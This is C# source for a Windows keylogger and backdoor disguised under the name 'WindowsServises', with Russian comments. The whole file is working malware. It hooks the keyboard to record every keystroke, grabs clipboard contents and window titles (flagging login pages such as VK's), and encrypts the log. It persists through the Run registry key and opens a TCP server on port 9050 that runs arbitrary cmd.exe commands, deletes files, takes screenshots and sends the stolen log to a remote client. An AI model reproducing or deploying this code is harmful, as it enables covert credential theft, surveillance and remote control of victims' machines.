using System;
using System.Windows;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Security.Cryptography;
using System.Drawing;
using System.Drawing.Imaging;
using Microsoft.Win32;

namespace WindowsServises
{
    class Program
    {
        const string name = "WindowsServises";

        // инициализируем параметры
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_KEYUP = 0x0101;
        private const int WM_SYSKEYUP = 0x0105;
        private const int WM_SYSKEYDOWN = 0x0104;
        public const int KF_REPEAT = 0X40000000;
        
        private const int VK_SHIFT = 0x10;	// SHIFT
        private const int VK_CONTROL = 0x11;	// CONTROL
        private const int VK_MENU = 0x12; // ALT
        private const int VK_CAPITAL = 0x14; // CAPS LOCK

        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        public static string mss;
        public static int myi = 0;

        [STAThread]
        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();    

            IntPtr _hwnd = GetForegroundWindow();
            StringBuilder sb = new StringBuilder(256);
            GetWindowText(_hwnd, sb, sb.Capacity);

            _hookID = SetHook(_proc);
            // получаем переменные окружения и данные о пользователе
            Writer(Encrypt("Start\n","Key"));
            Writer(Encrypt("CurrentDirectory: " + Environment.CurrentDirectory + "\n","Key"));
            Writer(Encrypt("MachineName: " + Environment.MachineName + "\n","Key"));
            Writer(Encrypt("OSVersion: " + Environment.OSVersion.ToString() + "\n","Key"));
            Writer(Encrypt("SystemDirectory: " + Environment.SystemDirectory + "\n","Key"));
            Writer(Encrypt("UserDomainName: " + Environment.UserDomainName + "\n", "Key"));
            Writer(Encrypt("UserName: " + Environment.UserName + "\n", "Key"));
            Writer(Encrypt("Window: " + sb.ToString() + "\n", "Key"));

            // получаем буфер обмена при запуске
            string htmlData = GetBuff();
            Writer(Encrypt("Buffer :"+ htmlData + "\n", "Key"));

            // получаем текущую раскладку клавиатуры

            ushort lang = GetKeyboardLayout();
            mss = lang.ToString();
            Writer(Encrypt("Первоначальная раскладка: " + mss + "\n", "Key"));

            Thread mtr = new System.Threading.Thread(ServerSocket);
            mtr.Start();
            Application.Run();


            UnhookWindowsHookEx(_hookID);
        }
       

        public static void SetAutorunValue(bool autorun, Socket sender)
        {
            string ExePath = System.Windows.Forms.Application.ExecutablePath;
            RegistryKey reg;
            reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
            try
            {
                if(autorun)
                {
                    reg.SetValue(name, ExePath);
                    SSend("Успешно установлено", sender);
                }
                else
                {
                    reg.DeleteValue(name);
                    SSend("Успешно удалено", sender);
                }
                reg.Close();
            }
            catch (Exception e)
            {
                SSend(e.Message, sender);
            }
        }

        public static void Screenshot()
        {
            // делаем скриншот
            Graphics graph = null;
            var bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);

            graph = Graphics.FromImage(bmp);
            graph.CopyFromScreen(0, 0, 0, 0, bmp.Size);
            bmp.Save(Application.StartupPath + @"\screen.jpg");
        }


        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        public static string Windowslast = null;

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)
            {
                IntPtr _hwnd = GetForegroundWindow();
                StringBuilder sb = new StringBuilder(256);
                GetWindowText(_hwnd, sb, sb.Capacity);

                string[] listKeyWord = { "Login","login","Register","register", "Welcome! | VK", "Добро пожаловать | ВКонтакте","log" };

                foreach (string s in listKeyWord)
                {
                    if (sb.ToString().ToUpperInvariant().Contains(s.ToUpperInvariant()))
                    {
                        if (Windowslast != sb.ToString())
                        {
                            Windowslast = sb.ToString();
                            Writer(Encrypt("Window: " + sb.ToString() + "\n", "Key"));
                        }

                    }
                }
                
                int vkCode = Marshal.ReadInt32(lParam);

                KeysConverter kc = new KeysConverter();
                string mystring = kc.ConvertToString((Keys)vkCode);

                string original = mystring;
                string encrypted;

                // запрашиваем раскладку клавиатуры для каждого символа


                ushort lang_check = GetKeyboardLayout();
                string mss_check = lang_check.ToString();

                if (mss == mss_check) { }
                else
                {
                    encrypted = "\n<Смена раскладки: " + mss_check + " >\n";
                    Writer(Encrypt("Window: " + sb.ToString() + "\n", "Key"));
                    Writer(Encrypt(encrypted, "Key"));
                    mss = mss_check;
                }

                if (wParam == (IntPtr)WM_KEYDOWN)   //пишем все клавиши подряд
                {
                    Writer(Encrypt(original,"Key"));

                }

                if (wParam == (IntPtr)WM_KEYUP) // пишем только те что были отпущены (в нашем случае все контрольные)
                {
                   // if (Keys.LControlKey == (Keys)vkCode) { Writer(Encrypt((original); } // если был отпущен = запись
                    if (Keys.LShiftKey == (Keys)vkCode)
                    {
                        Writer(Encrypt("↓","Key"));
                    } // если был отпущен = запись
                }

                // ловим сочетание клавиш CTRL+C (копирование в буфер)
                if (Keys.C == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {

                    string htmlData1 = GetBuff();                                                   // получаем буфер
                    encrypted = "\n<COPY>\n";
                  
                    Writer(Encrypt(encrypted, "Key"));
                    Writer(Encrypt("Содержимое буфера(buffer): " + htmlData1 + "\n", "Key"));                  // записываем буфер                                                                                                  
                    Writer(Encrypt("Window(виндовс): " + sb.ToString() + "\n", "Key"));
                }

                else if (Keys.V == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {
                    
                    encrypted = "\n<PASTE>\n";
                    Writer(Encrypt(encrypted, "Key"));
                    Writer(Encrypt("Window(виндовс): " + sb.ToString() + "\n", "Key"));

                }
                else if (Keys.Z == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {;
                    encrypted = "\n<Отмена>\n";
                    Writer(Encrypt(encrypted, "Key"));
                }
                else if (Keys.F == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {

                    encrypted = "\n<Искать>\n";
                    Writer(Encrypt(encrypted, "Key"));
                }
                else if (Keys.A == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {

                    encrypted = "\n<Выделить всё>\n";
                    Writer(Encrypt(encrypted, "Key"));
                    Writer(Encrypt("Window(виндовс): " + sb.ToString() + "\n", "Key"));
                }
                else if (Keys.N == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {

                    encrypted = "\n<Новый>\n";
                    Writer(Encrypt(encrypted, "Key"));
                }
                else if (Keys.T == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {

                    encrypted = "\n<Нов.вкладка>\n";
                    Writer(Encrypt(encrypted, "Key"));

                }
                else if (Keys.X == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {

                    encrypted = "\n<Вырезать>\n";
                    string htmlData1 = GetBuff();
                    Writer(Encrypt("Содержимое буфера: " + htmlData1 + "\n", "Key"));
                    Writer(Encrypt(encrypted, "Key"));
                    Writer(Encrypt("Window(виндовс): " + sb.ToString() + "\n", "Key"));
                }



            }


            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        public static string GetBuff()
        {
            string htmlData = Clipboard.GetText(TextDataFormat.Text);
            return htmlData;
        }

        public static string Encrypt(string plainText, string password, string salt = "Key", string hashAlgorithm = "SHA1", int passwordIterations = 2, string initialVector = "OFRna73m*aze01xY", int keySize = 256)
        {
            if (string.IsNullOrEmpty(plainText))
                return "";

            byte[] initialVectorBytes = Encoding.ASCII.GetBytes(initialVector);
            byte[] saltValueBytes = Encoding.ASCII.GetBytes(salt);
            byte[] plainTextBytes = Encoding.UTF8.GetBytes(plainText);

            PasswordDeriveBytes derivedPassword = new PasswordDeriveBytes
             (password, saltValueBytes, hashAlgorithm, passwordIterations);

            byte[] keyBytes = derivedPassword.GetBytes(keySize / 8);
            RijndaelManaged symmetricKey = new RijndaelManaged();
            symmetricKey.Mode = CipherMode.CBC;

            byte[] cipherTextBytes = null;

            using (ICryptoTransform encryptor = symmetricKey.CreateEncryptor
            (keyBytes, initialVectorBytes))
            {
                using (MemoryStream memStream = new MemoryStream())
                {
                    using (CryptoStream cryptoStream = new CryptoStream
                             (memStream, encryptor, CryptoStreamMode.Write))
                    {
                        cryptoStream.Write(plainTextBytes, 0, plainTextBytes.Length);
                        cryptoStream.FlushFinalBlock();
                        cipherTextBytes = memStream.ToArray();
                        memStream.Close();
                        cryptoStream.Close();
                    }
                }
            }

            symmetricKey.Clear();
            return Convert.ToBase64String(cipherTextBytes);
        }


        public static void NewProcess(string s, string fl, Socket client)
        {
            Process process = new Process();
            process.StartInfo.FileName = s;
            process.StartInfo.Arguments = fl;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardOutput = true;

            process.StartInfo.Verb = "runas";

            process.Start();


            StreamReader reader = process.StandardOutput;
            string output = reader.ReadToEnd();


            SSend(output, client);

            process.WaitForExit();
            process.Close();

            SSend("\n\nPress any key to exit.", client);
        }


        public static void SSend(string reply, Socket client)
        {
            byte[] msg = Encoding.UTF8.GetBytes(reply);
            client.Send(msg);
        }


        public static void ServerSocket()
        {

            IPEndPoint ipep = new IPEndPoint(IPAddress.Any, 9050);
            Socket newsock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

            try
            {
                newsock.Bind(ipep);
                newsock.Listen(10);
                Console.WriteLine("Waiting for a client...");

                while (true)
                {
                    {

                        Socket client = newsock.Accept();
                        IPEndPoint clientep = (IPEndPoint)client.RemoteEndPoint;
                        Console.WriteLine("Connected with {0} at port {1}", clientep.Address, clientep.Port);

                        string data = null;

                        // Мы дождались клиента, пытающегося с нами соединиться

                        byte[] bytes = new byte[1024 * 1024];
                        int bytesRec = client.Receive(bytes);
                        data += Encoding.UTF8.GetString(bytes, 0, bytesRec);
                        // Показываем данные на консоли
                        Console.Write("Полученный текст: " + data + "\n\n");

                        //////////////////////////////////////////////////

                        var splitChars = new[] { ' ' }; // разбивать будем по пробелу
                        string Arguments = "";

                        string[] a = data.Split(splitChars, 2);
                        string fileName = a[0];
                        if (a.Length > 1) Arguments = a[1];



                        //////////////////////////////////////////////////////////////////

                        switch (fileName)
                        {
                            case "ipconfig":

                                NewProcess("ipconfig", Arguments, client);
                                break;

                            case "help":
                                SSend("\n\n#################### Help  ####################\n" + "\nСинтаксис: cmd params <Enter>\nПримеры:\ncmd taskkill /IM notepad.exe /f" +
                                "\ncmd tasklist	\ncmd ipconfig /all\ncmd notepad.exe\n\nУдаление файлов:\ndel path_to_file или cmd del path_to file" +
                                "\nДля выполнения команд используется Windows CMD на стороне сервера\n" +
                                "\nscreen - создает screenshot сервера и отправляет клиенту\n" +
                                "\nlog - отправляет лог-файл клиенту" +
                                "install - добавить keyloger в автозагрузку"+
                                "uninstall - убрать keyloger с автозагрузки"+
                                "quit - выход"+
                                "\n\n################## END  ##################\n", client);
                                break;
                            case "quit":

                                SSend("BYE!", client);
                                break;

                            case "cmd":

                                if (Arguments.Length == 0)
                                {
                                    Console.WriteLine("Для команды флаги обязательны");
                                    SSend("Для команды флаги обязательны", client);
                                    break;
                                }

                                NewProcess("cmd.exe", "/C" + Arguments, client);
                                break;

                            case "del":
                                if (Arguments.Length == 0)
                                {
                                    SSend("Для команды флаги обязательны", client);
                                    break;
                                }
                                FileInfo fi2 = new FileInfo(Arguments);
                                try
                                {

                                    fi2.Delete();
                                    SSend("Файл удален", client);

                                }
                                catch (Exception ex)

                                {
                                    SSend(ex.ToString(), client);
                                    break;
                                }

                                break;

                            case "install":
                                SetAutorunValue(true, client);
                                break;

                            case "uninstall":
                                SetAutorunValue(false, client);
                                break;

                            default:
                                SSend("Невыполнимая команда. Попробуйте help", client);
                                break;

                        }

                        //////////////////////////////////////////////////
                        if (fileName == "screen")
                        {
                            Screenshot();
                            try
                            {
                                SocketWorker(@"\screen.jpg", client);

                            }
                            catch (Exception ex)
                            {
                                SSend("Error in screen", client);
                                SSend(ex.Message, client);
                            }

                        }

                        if (fileName == "log")
                        {
                            Screenshot();
                            try
                            {

                                SocketWorker(@"\log.dat", client);

                            }
                            catch (Exception ex)
                            {
                                SSend("Error in log", client);
                                SSend(ex.Message, client);
                            }

                        }
                    }
                }
            }

            catch (Exception e)
            {
                Console.Write(e.Message);
            }
        }


        public static void SocketWorker(string fileName, Socket client)
        {
            string filePath = Application.StartupPath;
            byte[] fileNameByte = Encoding.ASCII.GetBytes(fileName);

            byte[] fileData = File.ReadAllBytes(filePath + fileName);
            byte[] clientData = new byte[4 + fileNameByte.Length + fileData.Length];
            byte[] fileNameLen = BitConverter.GetBytes(fileNameByte.Length);

            fileNameLen.CopyTo(clientData, 0);
            fileNameByte.CopyTo(clientData, 4);
            fileData.CopyTo(clientData, 4 + fileNameByte.Length);


            client.Send(clientData);
            Console.WriteLine("File:{0} has been sent.", fileName);
        }


        // Записываем log в файл

        public static void Writer(string inputstring)
        {

            StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.dat", true);

            sw.WriteLine(inputstring);
            sw.Flush();
            sw.Close();

        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        internal static extern short GetKeyState(int keyCode);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern uint MapVirtualKey(uint uCode, uint uMapType);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        //------------------------------Пробуем узнать раскладку клавиатуры-------------------------------------------------//

        [DllImport("user32.dll", SetLastError = true)]
        static extern int GetWindowThreadProcessId(
            [In] IntPtr hWnd,
            [Out, Optional] IntPtr lpdwProcessId
            );

        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true)]
        static extern ushort GetKeyboardLayout(
            [In] int idThread
            );


        static ushort GetKeyboardLayout()
        {
            return GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), IntPtr.Zero));
        }

    }
}


